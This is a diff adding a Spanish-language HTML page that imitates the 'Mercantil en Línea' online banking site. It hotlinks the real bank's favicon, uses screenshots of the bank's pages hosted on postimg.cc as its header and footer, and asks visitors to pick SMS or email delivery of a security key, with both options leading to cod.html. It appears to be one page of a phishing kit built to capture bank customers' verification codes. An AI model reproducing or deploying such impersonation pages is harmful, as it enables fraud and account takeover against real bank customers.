@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="tk.css">
+    <style>
+        /* Eliminar subrayado de los enlaces */
+        a {
+            text-decoration: none;
+            color: inherit; /* Esto asegura que el color del texto se mantenga como en el estilo del párrafo */
+        }
+
+        /* Opcional: Ajustar el estilo del texto dentro de los enlaces si es necesario */
+        .security-method a p {
+            margin: 0; /* Para eliminar el margen adicional debajo del texto del enlace */
+        }
+
+        /* Estilo del pie de página */
+        .footer {
+            width: 100%; /* Asegura que el footer ocupe el ancho completo */
+            text-align: center; /* Centra el contenido */
+            padding: 0; /* Sin padding adicional, para un ajuste exacto */
+            background-color: #f1f1f1; /* Color de fondo ligero */
+        }
+
+        .footer img {
+            width: 100%; /* Asegura que la imagen ocupe el ancho completo del footer */
+            height: auto; /* Mantiene la proporción de la imagen */
+        }
+
+        /* Estilo del contenedor principal */
+        .container {
+            max-width: 1200px; /* Ancho máximo para pantallas grandes */
+            margin: 0 auto; /* Centrando el contenedor */
+            padding: 20px; /* Espaciado interno */
+            text-align: center; /* Centra el texto */
+        }
+
+        /* Estilos para los métodos de seguridad */
+        .security-method {
+            display: inline-block; /* Muestra los métodos en línea */
+            margin: 20px; /* Espaciado alrededor de cada método */
+        }
+
+        .security-method img {
+            max-width: 100px; /* Ancho máximo de las imágenes */
+            height: auto; /* Mantiene la proporción de las imágenes */
+        }
+
+        .security-method p {
+            margin-top: 10px; /* Espaciado superior para el texto */
+        }
+
+        /* Media Queries para pantallas más pequeñas */
+        @media (max-width: 768px) {
+            .security-method {
+                display: block; /* Apila los métodos en pantallas pequeñas */
+                margin: 10px auto; /* Centra y ajusta el margen */
+            }
+
+            .security-method img {
+                max-width: 80px; /* Ancho máximo más pequeño para pantallas pequeñas */
+            }
+
+            .footer-web {
+                display: none; /* Oculta el footer de escritorio en dispositivos móviles */
+            }
+
+            .footer-mobile {
+                display: block; /* Muestra el footer móvil en dispositivos móviles */
+                padding: 0; /* Sin padding adicional para un ajuste exacto */
+            }
+        }
+
+        @media (min-width: 769px) {
+            .footer-web {
+                display: block; /* Muestra el footer web en pantallas grandes */
+            }
+
+            .footer-mobile {
+                display: none; /* Oculta el footer móvil en pantallas grandes */
+            }
+        }
+    </style>
+</head>
+<body>
+       <!-- Footer para versión web -->
+       <div class="footer footer-web">
+        <img src="https://i.postimg.cc/jq6pmb95/Captura-de-pantalla-2024-09-10-213742.png" alt="Footer Web">
+    </div>
+
+    <!-- Footer para versión móvil -->
+    <div class="footer footer-mobile">
+        <img src="https://i.postimg.cc/kgSZ9vHs/Captura-de-pantalla-2024-09-10-175316.png" alt="Footer Móvil">
+    </div>
+    <div class="container">
+        <!-- Sección de verificación de dispositivo -->
+        <h1>Metodo de Seguridad</h1>
+        
+        <!-- Selección del método de seguridad -->
+        <p>Selecciona el método de seguridad de tu preferencia:</p>
+
+        <div class="security-method">
+            <a href="cod.html">
+                <img src="https://i.postimg.cc/fLrdCpNf/pixelcut-export-17.png" alt="Enviar clave al celular:">
+                <p>Enviar clave al celular</p>
+            </a>
+        </div>
+        <div class="security-method">
+            <a href="cod.html">
+                <img src="https://i.postimg.cc/brStBgYc/pixelcut-export-18.png" alt="Enviar clave al correo:">
+                <p>Enviar clave al correo</p>
+            </a>
+        </div>
+    </div>
+
+ 
+</body>
+</html>
